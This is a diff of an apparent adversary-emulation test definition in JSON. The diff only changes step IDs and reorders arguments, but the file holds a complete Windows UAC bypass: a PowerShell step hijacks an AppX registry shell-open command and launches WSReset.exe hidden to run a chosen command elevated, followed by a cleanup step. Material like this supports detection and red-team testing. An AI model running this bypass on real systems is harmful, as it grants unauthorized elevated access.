@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "dbca9e87-5813-4049-a24d-2b9f11aea200",
+      "id": "2bc6b178-1b96-51f8-85e4-7b665feaa7db",
       "type": "execute-command",
       "data": {
         "command": "New-Item #{commandpath} -Force | Out-Null\nNew-ItemProperty -Path #{commandpath} -Name \"DelegateExecute\" -Value \"\" -Force | Out-Null\nSet-ItemProperty -Path #{commandpath} -Name \"(default)\" -Value \"#{commandtorun}\" -Force -ErrorAction SilentlyContinue | Out-Null\n$Process = Start-Process -FilePath \"C:\\Windows\\System32\\WSReset.exe\" -WindowStyle Hidden",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "1ea6f58b-2019-4ab6-9d7e-4e13648e52a1",
+      "id": "da43e82e-c10a-5b57-b02a-e662497bec4d",
       "type": "execute-command",
       "data": {
         "command": "Remove-Item #{commandpath} -Recurse -Force",
@@ -27,14 +27,14 @@
   ],
   "flows": [
     {
-      "s": "dbca9e87-5813-4049-a24d-2b9f11aea200",
+      "s": "2bc6b178-1b96-51f8-85e4-7b665feaa7db",
       "p": "on-success",
-      "o": "1ea6f58b-2019-4ab6-9d7e-4e13648e52a1"
+      "o": "da43e82e-c10a-5b57-b02a-e662497bec4d"
     },
     {
-      "s": "dbca9e87-5813-4049-a24d-2b9f11aea200",
+      "s": "2bc6b178-1b96-51f8-85e4-7b665feaa7db",
       "p": "on-failure",
-      "o": "1ea6f58b-2019-4ab6-9d7e-4e13648e52a1"
+      "o": "da43e82e-c10a-5b57-b02a-e662497bec4d"
     }
   ],
   "tags": [
@@ -43,16 +43,16 @@
   ],
   "input_arguments": [
     {
-      "name": "commandtorun",
-      "type": "string",
-      "description": "Command to run",
-      "value": "C:\\Windows\\System32\\cmd.exe /c start cmd.exe"
-    },
-    {
       "name": "commandpath",
       "type": "string",
       "description": "Registry path",
       "value": "HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command"
+    },
+    {
+      "name": "commandtorun",
+      "type": "string",
+      "description": "Command to run",
+      "value": "C:\\Windows\\System32\\cmd.exe /c start cmd.exe"
     }
   ]
 }
